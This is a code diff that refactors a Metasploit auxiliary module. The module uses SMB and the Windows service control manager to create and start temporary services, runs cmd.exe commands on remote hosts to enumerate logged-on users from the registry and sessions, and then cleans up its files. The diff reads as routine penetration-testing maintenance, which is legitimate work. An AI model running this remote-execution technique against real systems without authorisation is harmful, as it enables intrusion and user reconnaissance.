@@ -86,8 +86,7 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			# Try and query HKU
 			command = "#{cmd} /C echo reg.exe QUERY HKU ^> C:#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
-			simple.connect(smbshare)
-			psexec(smbshare, command)
+			out = psexec(command)
 			output = get_output(ip, smbshare, text)
 			cleanout = Array.new
 			output.each_line { |line| cleanout << line.chomp if line.include?("HKEY") && line.split("-").size == 8 && !line.split("-")[7].include?("_")}
@@ -123,8 +122,7 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			key = key.split("HKEY_USERS\\")[1].chomp
 			command = "#{cmd} /C echo reg.exe QUERY \"HKU\\#{key}\\Volatile Environment\" ^> C:#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
-			simple.connect(smbshare)
-			psexec(smbshare, command)
+			out = psexec(command)
 			if output = get_output(ip, smbshare, text)
 				domain, username, dnsdomain, homepath, logonserver = "","","","",""
 				# Run this IF loop and only check for specified user if datastore['USERNAME'] is specified
@@ -176,9 +174,8 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			# Try and do cleanup command
 			cleanup = "#{cmd} /C del C:#{text} & del #{bat}"
-			simple.connect(smbshare)
 			print_status("Executing cleanup on host: #{peer}")
-			psexec(smbshare, cleanup)
+			out = psexec(cleanup)
 		rescue StandardError => cleanuperror
 			print_error("Unable to processes cleanup commands: #{cleanuperror}")
 			return cleanuperror
@@ -191,8 +188,7 @@ class Metasploit3 < Msf::Auxiliary
 	def query_session(smbshare, ip, cmd, text, bat)
 		begin
 			command = "#{cmd} /C echo query session ^> C:#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
-			simple.connect(smbshare)
-			psexec(smbshare, command)
+			out = psexec(command)
 			userline = ""
 			if output = get_output(ip, smbshare, text)
 				output.each_line { |line| userline << line if line[0] == '>' }
@@ -209,19 +205,16 @@ class Metasploit3 < Msf::Auxiliary
 
 	# This code was stolen straight out of psexec.rb.  Thanks very much HDM and all who contributed to that module!!
 	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
-	def psexec(smbshare, command)
-		filename = "filename"
-		servicename = "servicename"
-		simple.disconnect(smbshare)
+	def psexec(command)
 
 		simple.connect("IPC$")
 
 		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
-		vprint_status("Binding to #{handle} ...")
+		vprint_status("#{peer} - Binding to #{handle} ...")
 		dcerpc_bind(handle)
-		vprint_status("Bound to #{handle} ...")
+		vprint_status("#{peer} - Bound to #{handle} ...")
 
-		vprint_status("Obtaining a service manager handle...")
+		vprint_status("#{peer} - Obtaining a service manager handle...")
 		scm_handle = nil
 		stubdata =
 			NDR.uwstring("\\\\#{rhost}") +
@@ -233,14 +226,15 @@ class Metasploit3 < Msf::Auxiliary
 				scm_handle = dcerpc.last_response.stub_data[0,20]
 			end
 		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
+			print_error("#{peer} - Error: #{e}")
+			return false
 		end
 
-		displayname = "displayname"
+		servicename = Rex::Text.rand_text_alpha(11)
+		displayname = Rex::Text.rand_text_alpha(16)
 		holdhandle = scm_handle
-		svc_handle  = nil
-		svc_status  = nil
+		svc_handle = nil
+		svc_status = nil
 
 		stubdata =
 			scm_handle +
@@ -258,26 +252,26 @@ class Metasploit3 < Msf::Auxiliary
 			NDR.long(0) + # Password
 			NDR.long(0) + # Password
 			NDR.long(0) + # Password
-			NDR.long(0)  # Password
+			NDR.long(0) # Password
 		begin
-			vprint_status("Attempting to execute #{command}")
+			vprint_status("#{peer} - Creating the service...")
 			response = dcerpc.call(0x0c, stubdata)
 			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
 				svc_handle = dcerpc.last_response.stub_data[0,20]
 				svc_status = dcerpc.last_response.stub_data[24,4]
 			end
 		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
+			print_error("#{peer} - Error: #{e}")
+			return false
 		end
 
-		vprint_status("Closing service handle...")
+		vprint_status("#{peer} - Closing service handle...")
 		begin
 			response = dcerpc.call(0x0, svc_handle)
 		rescue ::Exception
 		end
 
-		vprint_status("Opening service...")
+		vprint_status("#{peer} - Opening service...")
 		begin
 			stubdata =
 				scm_handle +
@@ -289,11 +283,11 @@ class Metasploit3 < Msf::Auxiliary
 				svc_handle = dcerpc.last_response.stub_data[0,20]
 			end
 		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
+			print_error("#{peer} - Error: #{e}")
+			return false
 		end
 
-		vprint_status("Starting the service...")
+		vprint_status("#{peer} - Starting the service...")
 		stubdata =
 			svc_handle +
 			NDR.long(0) +
@@ -303,48 +297,30 @@ class Metasploit3 < Msf::Auxiliary
 			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
 			end
 		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
+			print_error("#{peer} - Error: #{e}")
+			return false
 		end
 
-		vprint_status("Removing the service...")
+		vprint_status("#{peer} - Removing the service...")
 		stubdata =
-			svc_handle +
-			NDR.wstring("C:\\WINDOWS\\Temp\\sam")
+			svc_handle
 		begin
 			response = dcerpc.call(0x02, stubdata)
 			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-			end
-		rescue ::Exception => e
-			print_error("Error: #{e}")
+		end
+			rescue ::Exception => e
+			print_error("#{peer} - Error: #{e}")
 		end
 
-		vprint_status("Closing service handle...")
+		vprint_status("#{peer} - Closing service handle...")
 		begin
 			response = dcerpc.call(0x0, svc_handle)
 		rescue ::Exception => e
-			print_error("Error: #{e}")
+			print_error("#{peer} - Error: #{e}")
 		end
 
-		begin
-			#print_status("Deleting \\#{filename}...")
-			select(nil, nil, nil, 1.0)
-			#This is not really useful but will prevent double \\ on the wire :)
-		if datastore['SHARE'] =~ /.[\\\/]/
-			simple.connect(smbshare)
-			simple.delete("C:\\WINDOWS\\Temp\\sam")
-		else
-			simple.connect(smbshare)
-			simple.delete("C:\\WINDOWS\\Temp\\sam")
-		end
-
-		rescue ::Interrupt
-			raise $!
-		rescue ::Exception
-			#raise $!
-		end
+		select(nil, nil, nil, 1.0)
 		simple.disconnect("IPC$")
-		simple.disconnect(smbshare)
+		return true
 	end
-
 end
